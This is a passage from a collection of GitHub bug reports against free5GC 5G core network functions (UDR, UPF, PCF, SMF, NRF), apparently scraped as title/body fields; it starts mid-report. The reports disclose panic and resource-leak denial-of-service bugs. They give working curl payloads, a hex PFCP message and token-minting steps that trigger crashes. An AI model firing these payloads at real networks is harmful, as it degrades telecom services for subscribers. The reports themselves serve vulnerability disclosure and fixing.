curl -i -sS -X DELETE \
  'http://10.100.200.11:8000/nudr-dr/v2/subscription-data/x/bad/ee-subscriptions/x/amf-subscriptions' \
  -H 'Authorization: Bearer <valid_nudr_dr_jwt>'
```

Observed output:

```text
HTTP/1.1 500 Internal Server Error
Content-Length: 0
```

5. Inspect `udr` logs:

```bash
docker logs --tail 40 udr 2>&1
```

Observed output includes:

```text
[ERRO][UDR][GIN] panic: runtime error: invalid memory address or nil pointer dereference
github.com/free5gc/udr/internal/sbi/processor.(*Processor).RemoveAmfSubscriptionsInfoProcedure
/go/src/free5gc/NFs/udr/internal/sbi/processor/event_amf_subscription_info_document.go:69
[INFO][UDR][GIN] | 500 | 10.100.200.1 | DELETE | /nudr-dr/v2/subscription-data/x/bad/ee-subscriptions/x/amf-subscriptions |
```

## Expected Behavior
If `subsId` does not exist under an existing UE state, `UDR` should return a controlled `404 SUBSCRIPTION_NOT_FOUND`.

Expected behavior:

- existing UE state + missing `subsId` -> `404`
- no dereference of a nil `EeSubscriptionCollection` entry
- no panic and no stack trace

## Screenshots
Not applicable for this server-side issue.

## Environment
- free5GC Version: `v4.2.1`
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `5.15.0-88-generic`
- go version: `go1.25.5 linux/amd64`

- Docker-based lab on the internal SBI network

items.title: [Bugs] UPF silently returns Cause=Accepted when RemoveBAR fails — gtp5g kernel buffer never released on session teardown, enabling memory exhaustion DoS; compounded by BAR-ID length field not validated allowing ID spoofing
items.body: ## Bug Decription A SessionModificationRequest containing a RemoveBAR IE referencing a non-existent BAR-ID causes the UPF to log a goroutine stack trace but unconditionally return Cause=RequestAccepted. The BAR removal silently fails. The gtp5g kernel-space packet buffer associated with the BAR is never released. This is exploitable as a kernel memory exhaustion DoS: during PDU session release or paging state transitions, the SMF sends RemoveBAR to release the kernel buffer allocated for IDLE-state packet buffering. If the PFCP-layer BAR state diverges from gtp5g's kernel state (via a prior double-remove or attacker-induced desync), RemoveBAR fails silently — the kernel buffer is never reclaimed. An attacker with N4 access can trigger this per-session with a single crafted packet, permanently leaking one kernel buffer slot per targeted session. In a production core handling thousands of simultaneous IDLE-state UEs, sustained triggering exhausts kernel memory allocated to gtp5g, causing OOM conditions in the kernel module and a complete data-plane buffering DoS affecting all UEs attempting paging state transitions. A second independently reportable vulnerability is exposed in the same trigger path: BAR-ID IE length is not validated. Per 3GPP TS 29.244 §8.2.118, BAR-ID is a fixed 1-octet field. The UPF silently accepts a 4-byte BAR-ID IE encoding, discards the upper 3 bytes, and uses the truncated value as the lookup key — with no error, no cause code, and no log warning. This allows an attacker to reference BAR-ID=0x00000001 (4-byte encoding, truncated to BAR(0x0)) to target a completely different BAR than declared, bypassing any application-layer control that keys on the nominal BAR-ID value. Impact Kernel memory exhaustion DoS via unreleased gtp5g buffers: Each silently failed RemoveBAR permanently retains a kernel-space packet buffer. Under sustained attack targeting IDLE-state sessions, gtp5g's buffer pool is exhausted, rendering paging state transitions (IDLE→CONNECTED handover data delivery) impossible for all UEs — a full data-plane availability DoS. Indefinite packet retention: Packets buffered for released sessions remain in kernel memory indefinitely, occupying buffer slots that can never be flushed and never be delivered. System restart is the only recovery. BAR-ID spoofing via length field abuse: A RemoveBAR IE with BAR-ID declared as 4 bytes but encoding a value with a non-zero upper byte targets a different BAR than the nominal ID suggests. An attacker can craft BAR-ID=0x00000100 (nominal=256, truncated=0) to remove BAR(0) while the message appears to reference the non-existent BAR(256) — bypassing any session-level access control that filters on declared BAR-ID. Compound vulnerability with RemoveFAR / session teardown: During session release, SMF typically sends RemovePDR + RemoveFAR + RemoveBAR in sequence. Silent failure of RemoveBAR combined with the RemoveFAR silent failure (above) means both the forwarding rule and the buffer are permanently retained — the released session is effectively immortal in the kernel. Internal path disclosure: Full goroutine stack trace on every trigger. Root Cause NFs/upf/internal/pfcp/session.go, handleSessionModificationRequest, line 239: err = sess.RemoveBAR(i) if err != nil { sess.log.Errorf("Mod RemoveBAR error: %+v", err) // error discarded — kernel buffer never released; Cause=RequestAccepted returned } NFs/upf/internal/pfcp/node.go, (*Sess).RemoveBAR, line 483: func (s *Sess) RemoveBAR(id uint8) error { if _, ok := s.BARs[id]; !ok { return fmt.Errorf("RemoveBAR: BAR(%#x) not found", id) } // ... } Secondary — BAR-ID IE length not validated (IE parsing layer): A BAR-ID IE with length=4 is accepted without error; only the least-significant byte is extracted as the uint8 key. No Cause=MandatoryIEIncorrect or length-mismatch rejection is issued, violating 3GPP TS 29.244 §7.6. ## To Reproduce Steps to reproduce the behavior: Run: python3 free5gc_upf_remove_bar_not_found_repro.py [free5gc_upf_remove_bar_not_found_repro.py](https://github.com/user-attachments/files/26703895/free5gc_upf_remove_bar_not_found_repro.py) ## Expected Behavior When RemoveBAR fails, the UPF must return Cause=RuleCreationModificationFailure per 3GPP TS 29.244 §7.5.4. Silent acceptance of a failed BAR removal leaves an unreleased kernel buffer — a directly exploitable memory exhaustion DoS vector. A BAR-ID IE with declared length ≠ 1 byte must be rejected with Cause=MandatoryIEIncorrect per 3GPP TS 29.244 §7.6. Silently truncating an oversized BAR-ID enables ID spoofing attacks against the BAR lookup table. ## Screenshots ## Environment free5GC Version: v4.2.1] OS: Ubuntu 22.04 Kernel version: normal go version: normal C compiler version (optional): normal ## Trace Files ### Configuration Files version: 1.0.3 description: UPF initial local configuration pfcp: addr: 127.0.0.8 # IP addr for listening nodeID: 127.0.0.8 # External IP or FQDN can be reached retransTimeout: 1s # retransmission timeout maxRetrans: 3 # the max number of retransmission ### PCAP File [free5gc_upf_remove_bar_not_found_repro.zip](https://github.com/user-attachments/files/26703888/free5gc_upf_remove_bar_not_found_repro.zip) ### Log File 2026-04-14T08:02:11.790920556Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805] handleSessionModificationRequest 2026-04-14T08:02:11.790960780Z [ERRO][UPF][PFCP][LAddr:127.0.0.8:8805][CPNodeID:127.0.0.100][CPSEID:0x7005][UPSEID:0x1] Mod RemoveBAR error: RemoveBAR: BAR(0x0) not found github.com/free5gc/go-upf/internal/pfcp.(*Sess).RemoveBAR /home/fei/free5gc/NFs/upf/internal/pfcp/node.go:483 github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).handleSessionModificationRequest /home/fei/free5gc/NFs/upf/internal/pfcp/session.go:239 github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).reqDispacher /home/fei/free5gc/NFs/upf/internal/pfcp/dispacher.go:23 github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).main /home/fei/free5gc/NFs/upf/internal/pfcp/pfcp.go:156 runtime.goexit /home/fei/go/pkg/mod/golang.org/toolchain@v0.0.1-go1.25.5.linux-amd64/src/runtime/asm_amd64.s:1693

items.title: [Bugs] UPF vulnerable to malformed PFCP Session Establishment Request causing denial of service via timer resource leakage
items.body: ## Bug Decription A critical denial-of-service (DoS) vulnerability exists in the UPF's PFCP (Packet Forwarding Control Protocol) handler where a specially crafted Session Establishment Request causes the UPF to leak timer resources that are never cleaned up. The core issue is timer resource leakage: Even when PDR and FAR creation fails (with "invalid argument" errors), the UPF still successfully creates periodic timers for URRs (Usage Reporting Rules), leaving background goroutines and memory allocated indefinitely. The vulnerability demonstrates two attack vectors: 1.Timer resource leakage: Despite PDR and FAR creation failure, UPF creates URR timers that continue running in the background, consuming CPU and memory resources 2.Inconsistent state: UPF enters a half-created state (with URRs but no PDRs/FARs) that prevents normal PFCP message processing A single malicious PFCP message from an attacker can create permanent background timers that accumulate over time, eventually exhausting UPF resources and rendering it unable to process legitimate SMF heartbeat and association requests. ## To Reproduce Steps to reproduce the behavior: 1. Start free5gC 2. Sending Association Setup Request (30 bytes): 2005001a75b78900003c0005007f00006400600004ed103703005900013f 3. Sending Session Establishment Request (1335 bytes)  ## Expected Behavior The UPF should: Validate input rigorously: Check all PFCP IEs for valid ranges, combinations, and consistency before processing Graceful error handling: Reject malformed messages with appropriate PFCP Cause values (e.g., 73 - Invalid arguments) without entering an inconsistent state Resource protection: Implement resource limits and quotas to prevent exhaustion attacks Isolation and recovery: Isolate the impact of malformed messages and maintain ability to process other requests Timeouts and cleanup: Implement timeouts for message processing and automatic cleanup of partially created sessions Input sanitization: Reject or sanitize invalid values like 0xffffffff for IDs, malformed IP addresses, etc. ## Screenshots ## Environment free5GC Version: v4.0.1 OS: Ubuntu 20.04 Server Kernel version: 6.8.0-47-generic go version: go1.24.5 linux/amd64 ## Trace Files ### Configuration Files pfcp: addr: 127.0.0.8 # IP addr for listening nodeID: 127.0.0.8 # External IP or FQDN can be reached retransTimeout: 1s # retransmission timeout maxRetrans: 3 # the max number of retransmission peers: - addr: 127.0.0.8 # self - addr: 127.0.0.100 # fuzzer address - addr: 192.168.20.3 # message ip - addr: 192.168.0.3 ### PCAP File [786.zip](https://github.com/user-attachments/files/24578505/786.zip) ### Log File 2026-01-13T03:14:11.056267928Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805][CPNodeID:127.0.0.100] New node 2026-01-13T03:14:11.058870632Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805] handleSessionEstablishmentRequest 2026-01-13T03:14:11.058961125Z [INFO][UPF][PFCP][LAddr:127.0.0.8:8805][CPNodeID:127.0.0.100][CPSEID:0x31905892eb3f3f41][UPSEID:0x1] New session 2026-01-13T03:14:11.060039422Z [INFO][UPF][Perio] recv event[TYPE_PERIO_ADD][{eType:1 lSeid:1 urrid:4294967295 period:10000000000}] 2026-01-13T03:14:11.060079491Z [INFO][UPF][Perio] new ticker [10s] 2026-01-13T03:14:21.061012459Z [INFO][UPF][Perio] recv event[TYPE_PERIO_TIMEOUT][{eType:3 lSeid:0 urrid:0 period:10000000000}] 2026-01-13T03:14:28.461043042Z [ERRO][SMF][Main] PFCP Heartbeat error: SendPfcpHeartbeatRequest error: request Transaction [4]: retry-out 2026-01-13T03:14:28.461129281Z [INFO][SMF][Main] Release all resources of UPF [127.0.0.8] 2026-01-13T03:14:28.461142184Z [INFO][SMF][Main] Sending PFCP Association Request to UPF[127.0.0.8] 2026-01-13T03:14:37.465660810Z [WARN][SMF][Main] Failed to setup an association with UPF[[127.0.0.8]], error:request Transaction [5]: retry-out 2026-01-13T03:15:07.478423897Z [INFO][SMF][Main] Sending PFCP Association Request to UPF[127.0.0.8]

items.title: [Bugs] PCF smpolicy update RemainGbr nil dereference
items.body:
## Bug Decription
`PCF` `POST /npcf-smpolicycontrol/v1/sm-policies/{smPolicyId}/update` panics with `runtime error: invalid memory address or nil pointer dereference` inside `HandleUpdateSmPolicyContextRequest` when an SMF (or any NF holding `npcf-smpolicycontrol` scope) issues a UE-initiated CREATE_PCC_RULE update carrying a GBR-class `reqQos` (5QI ≤ 4) **for a subscriber whose subscription data has no aggregate GBR configured**.

`smPolicy.RemainGbrDL` and `smPolicy.RemainGbrUL` are `*float64` pointers that are only initialised in `HandleCreateSmPolicyRequest` if the matching `dnnData.GbrDl` / `dnnData.GbrUl` strings (read from UDR's `policyData.ues.smData`) are **non-empty**. For subscribers provisioned via the default webconsole flow, those fields are empty and the pointers stay `nil`.

`DecreaseRemainGBR` (in `internal/context/ue.go`) writes through those pointers via `DecreaseRamainBitRate`, which **does** nil-guard the pointer write. But it still returns the original `gbrDl` / `gbrUl` strings from the request, so the `qosData.GbrDl != ""` check on line 690 evaluates true even when `RemainGbrDL` is nil. The very next line then dereferences it inside a `Tracef` argument list:

```go
// internal/sbi/processor/smpolicy.go (deployed v4.2.2 — PCF v1.4.3 line numbers,
//                                     identical at upstream master commit df6c0da)
case models.RuleOperation_CREATE_PCC_RULE:
    ...
    qosData.GbrDl, qosData.GbrUl, err = smPolicy.DecreaseRemainGBR(req.ReqQos)   // line 682
    if err != nil { ... }
    if qosData.GbrDl != "" {
        logger.SmPolicyLog.Tracef(
            "SM Policy Dnn[%s] Data Aggregate decrease %s and then DL GBR remain[%.2f Kbps]",
            smPolicyContext.Dnn, qosData.GbrDl, *smPolicy.RemainGbrDL)            // <-- 692: nil deref
    }
    if qosData.GbrUl != "" {
        logger.SmPolicyLog.Tracef(
            "SM Policy Dnn[%s] Data Aggregate decrease %s and then UL GBR remain[%.2f Kbps]",
            smPolicyContext.Dnn, qosData.GbrUl, *smPolicy.RemainGbrUL)            // <-- 696: same
    }
```

The companion sites in `DecreaseRemainGBR` / `DecreaseRamainBitRate` itself **do** check `remainBitRate != nil`, which is exactly the precedent that lines 692 / 696 should follow.

The same buggy pattern appears **four times** in the same handler (CREATE_PCC_RULE branch and MODIFY_PCC_RULE_* branches both reuse the unsafe `Tracef`):

| Branch | Line | Field |
|---|---|---|
| `RuleOperation_CREATE_PCC_RULE` | 692 | `*smPolicy.RemainGbrDL` |
| `RuleOperation_CREATE_PCC_RULE` | 696 | `*smPolicy.RemainGbrUL` |
| `RuleOperation_MODIFY_PCC_RULE_*` | 745 | `*smPolicy.RemainGbrDL` |
| `RuleOperation_MODIFY_PCC_RULE_*` | 749 | `*smPolicy.RemainGbrUL` |

All four are reachable via the same UE-initiated SmPolicy update with `repPolicyCtrlReqTriggers: ["RES_MO_RE"]`; the only difference is whether `ueInitResReq.ruleOp` is `CREATE_PCC_RULE` (lines 692/696) or one of the `MODIFY_PCC_RULE_*` variants (lines 745/749).

This is **distinct from**:
- The `policyauthorization.go:1156` `bdtData := resp.BdtData` panic — that one is on the AF→PCF policyauthorization path with a missing `bdtRefId`, not the SMF→PCF SmPolicy update path.
- The `bdtpolicy.go:198` `bdtData.TransPolicy.RecTimeInt = ...` chain — different code path under `/npcf-bdtpolicycontrol`.

The same lines are **unfixed at the latest upstream master commit `df6c0da`**.

## To Reproduce
Steps to reproduce the behaviour:

1. Run free5GC `v4.2.2` Docker deployment (NRF `10.100.200.4:8000`, PCF `10.100.200.3:8000`, SMF `10.100.200.13:8000`, OAuth enabled). Register a subscriber whose UDR `smData` has empty `dnn[].gbrDl` / `dnn[].gbrUl` (the default webconsole flow does this — no need to do anything special).

2. Drive a real UE registration + PDU session via UERANSIM so PCF holds a live SmPolicy:

```bash
# In the UE container:
./nr-ue -c config/uecfg.yaml &
sleep 5
# At this point PCF logs show "Handle CreateSmPolicy" → 201 for /npcf-smpolicycontrol/v1/sm-policies
# and the smPolicyId is "imsi-<supi>-<pduSessionId>", e.g. imsi-208930000000001-1
```

3. Obtain the actual SMF instance ID from NRF (the PCF token issuer rejects unregistered SMF instance IDs):

```bash
DISC_TOKEN=$(curl -s -X POST 'http://10.100.200.4:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=client_credentials' \
  --data-urlencode 'nfType=AMF' \
  --data-urlencode 'nfInstanceId=09c2c82b-4ed5-43df-b0fc-c7098d1fa5a0' \
  --data-urlencode 'targetNfType=NRF' \
  --data-urlencode 'scope=nnrf-disc' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')

SMF_INST=$(curl -s 'http://10.100.200.4:8000/nnrf-disc/v1/nf-instances?target-nf-type=SMF&requester-nf-type=AMF' \
  -H "Authorization: Bearer $DISC_TOKEN" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["nfInstances"][0]["nfInstanceId"])')
```

4. Issue a `npcf-smpolicycontrol` token under the SMF identity:

```bash
SMPOLICY_TOKEN=$(curl -s -X POST 'http://10.100.200.4:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=client_credentials' \
  --data-urlencode 'nfType=SMF' \
  --data-urlencode "nfInstanceId=$SMF_INST" \
  --data-urlencode 'targetNfType=PCF' \
  --data-urlencode 'scope=npcf-smpolicycontrol' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
```

5. Send the malformed update — `5qi:1` (GBR class) with a non-empty `gbrDl`:

```bash
curl -i -X POST 'http://10.100.200.3:8000/npcf-smpolicycontrol/v1/sm-policies/imsi-208930000000001-1/update' \
  -H "Authorization: Bearer $SMPOLICY_TOKEN" -H 'Content-Type: application/json' \
  --data '{
    "repPolicyCtrlReqTriggers":["RES_MO_RE"],
    "ueInitResReq":{
      "ruleOp":"CREATE_PCC_RULE",
      "precedence":50,
      "reqQos":{"5qi":1,"gbrDl":"100 Kbps","gbrUl":"100 Kbps"},
      "packFiltInfo":[{"packFiltCont":"permit out ip from any to assigned","packFiltId":"PFx"}]
    }
  }'
```

6. PCF returns `HTTP/1.1 500 Internal Server Error` (Gin recovery). `docker logs pcf` shows:

```text
[INFO][PCF][SMpolicy] Handle UpdateSmPolicyContext
[ERRO][PCF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
github.com/free5gc/pcf/internal/sbi/processor.(*Processor).HandleUpdateSmPolicyContextRequest(...)
        /go/src/free5gc/NFs/pcf/internal/sbi/processor/smpolicy.go:692 +0x47de
github.com/free5gc/pcf/internal/sbi.(*Server).HTTPUpdateSMPolicy(0xc00040d960, 0xc00023a200)
        /go/src/free5gc/NFs/pcf/internal/sbi/api_smpolicy.go:161 +0x590
[INFO][PCF][GIN] | 500 |    10.100.200.1 | POST    | /npcf-smpolicycontrol/v1/sm-policies/imsi-208930000000001-1/update |  |
```

Each subsequent malformed update reproduces the panic. PCF stays up because Gin's `defer recover()` catches it, but every request leaves a stack trace in logs and the SmPolicy update fails — usable as a per-request DoS / log-volume amplification.

A `5qi`-≤-4 + `gbrUl`-only payload triggers the symmetric panic at line 696 instead.

## Expected Behavior
Either nil-guard the pointer dereferences in the `Tracef` calls:

```go
if qosData.GbrDl != "" && smPolicy.RemainGbrDL != nil {
    logger.SmPolicyLog.Tracef("...DL GBR remain[%.2f Kbps]", *smPolicy.RemainGbrDL)
}
if qosData.GbrUl != "" && smPolicy.RemainGbrUL != nil {
    logger.SmPolicyLog.Tracef("...UL GBR remain[%.2f Kbps]", *smPolicy.RemainGbrUL)
}
```

— or initialise `RemainGbrDL`/`RemainGbrUL` to a zero `float64` for every SmPolicy regardless of UDR config, so the pointer is always valid. Either way a malformed/edge-case GBR request should result in a controlled `400 ERROR_TRAFFIC_MAPPING_INFO_REJECTED` (or similar) `ProblemDetails`, not a goroutine panic / 500.

## Environment
- free5GC Version: `v4.2.2`
- PCF binary: `free5gc/pcf:v4.2.2` (PCF release tag `v1.4.3`). The same `smpolicy.go:692` / `:696` lines are **unfixed at the latest upstream master commit `df6c0da`** (no nil-guard added to the `Tracef` argument).

items.title: [Bugs] SMF `nsmf-pdusession` `POST /sm-contexts` panics when UDM discovery returns `200` with an empty `NfInstances` list
items.body:
## Bug Decription
`SMF` protects `nsmf-pdusession` with OAuth2 middleware, but the create path still contains a request-triggerable panic when upstream `UDM` discovery returns `200 OK` with an empty `NfInstances` array.

The create handler always calls `SendNFDiscoveryUDM()` before continuing:

- `NFs/smf/internal/sbi/processor/pdu_session.go:85`
- `NFs/smf/internal/sbi/processor/pdu_session.go:91`

Inside `SendNFDiscoveryUDM()`, the `nil`-error branch dereferences `result.NfInstances[0]` without a length check:

```go
case nil:
    smfContext.UDMProfile = result.NfInstances[0]
```

Code evidence:

- `NFs/smf/internal/sbi/consumer/nrf_service.go:286`
- `NFs/smf/internal/sbi/consumer/nrf_service.go:299`

Docker validation on March 22, 2026 local time:

1. `SMF` was manually restarted after the earlier `UPI` crash validation, which re-registered it to `NRF` with `nfInstanceId=b5d29d3e-3d12-47e1-b21f-5caae3dc00e4`.
2. A valid `nsmf-pdusession` token was obtained from `NRF`.
3. An authenticated minimal `multipart/related` `POST /nsmf-pdusession/v1/sm-contexts` was sent with create data for `DNN=internet`, `S-NSSAI={sst:1, sd:010203}`, `ServingNetwork=208/93`, and a minimal NAS PDU Session Establishment Request body.
4. `NRF` logged a successful discovery lookup:

```text
GET /nnrf-disc/v1/nf-instances?requester-nf-type=SMF&target-nf-type=UDM -> 200
```

5. `SMF` then panicked with:

```text
panic: runtime error: index out of range [0] with length 0
github.com/free5gc/smf/internal/sbi/consumer.(*nnrfService).SendNFDiscoveryUDM
    /go/src/free5gc/NFs/smf/internal/sbi/consumer/nrf_service.go:299 +0x445
```

6. `smf` returned `500` for `POST /nsmf-pdusession/v1/sm-contexts`.

This is a panic-based DoS on the authenticated `nsmf-pdusession` create path under a realistic upstream-registration failure condition. In this lab the process stayed alive because Gin recovery converted the panic into `500`, but the endpoint remains crashable by repeated request traffic whenever `UDM` discovery returns an empty result.

## To Reproduce
Steps to reproduce the behavior:

1. Ensure `SMF` is registered in `NRF`. In this validation the running `SMF` instance ID was:

```text
b5d29d3e-3d12-47e1-b21f-5caae3dc00e4
```

2. Obtain a valid `nsmf-pdusession` token:

```bash
curl -sS -X POST http://10.100.200.3:8000/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=SMF&nfInstanceId=b5d29d3e-3d12-47e1-b21f-5caae3dc00e4&targetNfType=SMF&scope=nsmf-pdusession'
```

3. Send an authenticated minimal `multipart/related` `POST /nsmf-pdusession/v1/sm-contexts` that reaches `HandlePDUSessionSMContextCreate()`. In this validation the request used:

- `supi=imsi-208930000000003`
- `pduSessionId=11`
- `dnn=internet`
- `sNssai={sst:1, sd:010203}`
- `servingNetwork={mcc:208, mnc:93}`
- `anType=3GPP_ACCESS`
- `requestType=INITIAL_REQUEST`
- a minimal NAS PDU Session Establishment Request as `N1SmMsg`

4. Confirm with logs:

```bash
docker logs --tail 50 smf 2>&1
docker logs --tail 30 nrf 2>&1
```

Observed server-side output includes:

```text
2026-03-21T23:50:40.855802676Z [INFO][NRF][GIN] | 200 | 10.100.200.6 | GET | /nnrf-disc/v1/nf-instances?requester-nf-type=SMF&target-nf-type=UDM |
2026-03-21T23:50:40.856780441Z [ERRO][SMF][GIN] panic: runtime error: index out of range [0] with length 0
github.com/free5gc/smf/internal/sbi/consumer.(*nnrfService).SendNFDiscoveryUDM
    /go/src/free5gc/NFs/smf/internal/sbi/consumer/nrf_service.go:299 +0x445
2026-03-21T23:50:40.856800907Z [INFO][SMF][GIN] | 500 | 10.100.200.1 | POST | /nsmf-pdusession/v1/sm-contexts |
```

## Expected Behavior
If `UDM` discovery returns an empty result, `SMF` should return a controlled upstream-failure response, not panic.

Expected behavior:

- empty discovery result -> controlled `5xx` or `ProblemDetails`
- no `result.NfInstances[0]` dereference without `len(...)` validation
- no panic and no stack trace on authenticated create traffic

## Screenshots
N/A

## Environment
**Please, complete the following information:**
- free5GC Version: `v4.2.1`
- Runtime image: `free5gc/smf:v4.2.1`
- Runtime SMF commit hash: `8385c00a`
- Validation date: March 22, 2026 local time (`2026-03-21T23:50:40Z` in logs)
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `5.15.0-88-generic`
- go version: `go1.24.9 linux/amd64`
- C compiler version (optional): `gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0`

## Trace Files
### Configuration Files
No source patch or persistent configuration change was required for this reproduction. The issue was observed against the stock Docker-based `SMF` runtime for free5GC `v4.2.1`, with the runtime condition that `NRF` returned `200 OK` to UDM discovery but the `NfInstances` array was empty.

### PCAP File
Not attached in this report.

### Log File
Relevant `smf` log excerpt:

```text
2026-03-21T23:50:40.848733224Z [INFO][SMF][PduSess] Receive Create SM Context Request
2026-03-21T23:50:40.848855604Z [INFO][SMF][PduSess] In HandlePDUSessionSMContextCreate
2026-03-21T23:50:40.856780441Z [ERRO][SMF][GIN] panic: runtime error: index out of range [0] with length 0
github.com/free5gc/smf/internal/sbi/consumer.(*nnrfService).SendNFDiscoveryUDM
    /go/src/free5gc/NFs/smf/internal/sbi/consumer/nrf_service.go:299 +0x445
github.com/free5gc/smf/internal/sbi/processor.(*Processor).HandlePDUSessionSMContextCreate
    /go/src/free5gc/NFs/smf/internal/sbi/processor/pdu_session.go:86 +0x658
2026-03-21T23:50:40.856800907Z [INFO][SMF][GIN] | 500 | 10.100.200.1 | POST | /nsmf-pdusession/v1/sm-contexts |
```

Relevant `nrf` log excerpt:

```text
2026-03-21T23:50:40.855468027Z [INFO][NRF][DISC] Handle NFDiscoveryRequest
2026-03-21T23:50:40.855802676Z [INFO][NRF][GIN] | 200 | 10.100.200.6 | GET | /nnrf-disc/v1/nf-instances?requester-nf-type=SMF&target-nf-type=UDM |
```

## System Architecture (Optional)
Docker-based free5GC lab on the internal SBI network:

- source host issuing PoCs: `10.100.200.1`
- NRF: `10.100.200.3:8000`
- SMF: `10.100.200.6:8000`

## Walkthrough (Optional)
The authenticated create path reaches `HandlePDUSessionSMContextCreate()`, which always performs UDM discovery before later request processing. If `NRF` returns `200 OK` with an empty `NfInstances` list, the `nil`-error branch in `SendNFDiscoveryUDM()` dereferences `result.NfInstances[0]` without checking length, producing a deterministic panic.

## Additional Context
- This report is distinct from issue `#894`. Issue `#894` describes a broader `500`-error robustness problem during malformed PDU session flows, while this report identifies a concrete panic sink in `SendNFDiscoveryUDM()` with exact line-level evidence and a specific upstream trigger condition.
- The original test intent was to drive the later `AMF` discovery path with a bogus `ServingNfId`, but the current lab exposed a stronger earlier crash in `UDM` discovery because the `UDM` discovery result was empty first.

items.title: [Bugs] NRF POST /oauth2/token structured-form parser panic DoS family
items.body:
## Bug Decription
`NRF` root SBI endpoint `POST /oauth2/token` contains a parser-level panic DoS family. In `NFs/nrf/internal/sbi/api_accesstoken.go`, the handler reflects over `models.NrfAccessTokenAccessTokenReq`, special-cases only plain `string` fields and `NrfNfManagementNfType`, and treats every other field as if it were a single `models.PlmnId`. The parsed `*models.PlmnId` is then assigned with `reflect.Value.Set()` to an attacker-selected destination field type, which panics when the real field type is incompatible.

Relevant code references:
- `NFs/nrf/internal/sbi/api_accesstoken.go:52`
- `NFs/nrf/internal/sbi/api_accesstoken.go:87`
- `NFs/nrf/internal/sbi/api_accesstoken.go:98`
- `NFs/nrf/internal/sbi/api_accesstoken.go:100`
- `NFs/nrf/internal/sbi/api_accesstoken.go:112`
- `/home/ubuntu/go/pkg/mod/github.com/free5gc/openapi@v1.2.3/models/model_nrf_access_token_access_token_req.go:27`
- `/home/ubuntu/go/pkg/mod/github.com/free5gc/openapi@v1.2.3/models/model_nrf_access_token_access_token_req.go:29`
- `/home/ubuntu/go/pkg/mod/github.com/free5gc/openapi@v1.2.3/models/model_nrf_access_token_access_token_req.go:30`
- `/home/ubuntu/go/pkg/mod/github.com/free5gc/openapi@v1.2.3/models/model_nrf_access_token_access_token_req.go:31`

Confirmed crashing fields in this DoS family:
- `requesterPlmnList` -> panic assigning `*models.PlmnId` to `[]models.PlmnId`
- `requesterSnssaiList` -> panic assigning `*models.PlmnId` to `[]models.Snssai`
- `requesterSnpnList` -> panic assigning `*models.PlmnId` to `[]models.PlmnIdNid`
- `targetSnpn` -> panic assigning `*models.PlmnId` to `*models.PlmnIdNid`
- `targetSnssaiList` -> panic assigning `*models.PlmnId` to `[]models.Snssai`
- `targetNsiList` -> panic assigning `*models.PlmnId` to `[]string`

In the validation lab, Gin recovery converted these panics into `HTTP 500`, but the endpoint remains remotely panicable and repeatedly triggerable. Because `/oauth2/token` is the root token-issuance endpoint, an attacker can use any of the confirmed form keys above to force repeated request failures, generate stack traces, and degrade or deny token issuance.

## To Reproduce
Steps to reproduce the behavior:
1. Send a malformed access-token request to `NRF` with `Content-Type: application/x-www-form-urlencoded` and one of the confirmed structured fields below. Any single request is sufficient to trigger the bug family.

```bash
curl -i -X POST http://10.100.200.3:8000/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'requesterPlmnList={"mcc":"208","mnc":"93"}'

curl -i -X POST http://10.100.200.3:8000/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'requesterSnssaiList={"mcc":"208","mnc":"93"}'

curl -i -X POST http://10.100.200.3:8000/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'requesterSnpnList={"mcc":"208","mnc":"93"}'

curl -i -X POST http://10.100.200.3:8000/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'targetSnpn={"mcc":"208","mnc":"93"}'

curl -i -X POST http://10.100.200.3:8000/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'targetSnssaiList={"mcc":"208","mnc":"93"}'

curl -i -X POST http://10.100.200.3:8000/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'targetNsiList={"mcc":"208","mnc":"93"}'
```

2. Observe that each request returns `HTTP/1.1 500 Internal Server Error`.

Representative observed response:

```text
HTTP/1.1 500 Internal Server Error
Content-Length: 0
```

3. Check the `NRF` container logs and confirm that the handler panicked in `HTTPAccessTokenRequest`.

```bash
docker logs --since '2026-03-19T22:36:00Z' nrf 2>&1
docker logs --since '2026-03-22T00:55:44Z' nrf 2>&1
docker logs --since '2026-03-22T05:29:01Z' nrf 2>&1
```

4. Confirm that the panic string changes with the chosen field type, but the root cause stays the same: `reflect.Set()` is assigning `*models.PlmnId` into an incompatible destination type.

## Expected Behavior
`NRF` should reject malformed or unsupported structured form fields with a controlled `400`-class validation error.

Expected behavior:
- invalid or unsupported structured form input should fail validation without panicking
- `POST /oauth2/token` should not return `500` for attacker-controlled form keys
- no stack trace or repeated panic should be reachable from network input on the token endpoint

## Screenshots
Not applicable for this SBI issue. The bug is fully observable through HTTP responses and `docker logs`.

## Environment
- free5GC Version: `v4.2.1`
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `5.15.0-88-generic`
- go version: `go1.24.9 linux/amd64`
- Runtime image: `free5gc/nrf:v4.2.1`
- Validation date: `2026-03-22`

Representative log excerpts from the validated panic family:

```text
2026-03-22T05:29:01.373398839Z [ERRO][NRF][GIN] panic: reflect.Set: value of type *models.PlmnId is not assignable to type *models.PlmnIdNid
```

